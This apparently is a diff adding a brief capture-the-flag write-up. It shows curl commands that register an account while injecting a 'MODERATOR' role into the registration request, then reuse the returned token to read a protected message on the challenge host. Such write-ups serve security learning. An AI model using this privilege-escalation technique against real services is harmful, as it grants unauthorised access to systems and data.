@@ -1,0 +1,10 @@
+You can use burp or do this:
+
+1) curl --path-as-is -i -s -k -X $'POST' -H '$HOST: escatlate-52bc47e034fa.1753ctf.com' -H $'User-Agent: Im.catthesecond' -H'Content-Type: application/json' -H $'Content-Lenght: 53' --data-binary $'{\"username\":\"fw\",\"password\":\"test\",\"role\":\"MODERATOR\"}' $'https://escatlate-52bc47e034fa.1753ctf.com/api/register'
+(on the register page, change the role)
+
+2) receive the token role : {"username":"fw","password":"test","token":"336acba143e311f0371d56a04f1698aad191017df4162b0a32f78aadb5298ccd","role":"MODERATOR"}
+
+3) change the token on your next request for the message : curl --path-as-is -i -s -k -X $'GET' \
+    -H $'Host: escatlate-52bc47e034fa.1753ctf.com' -H $'User-Agent: Mr.FireFox' -H $'X-Token: 336acba143e311f0371d56a04f1698aad191017df4162b0a32f78aadb5298ccd' \           
+    $'https://escatlate-52bc47e034fa.1753ctf.com/api/message'
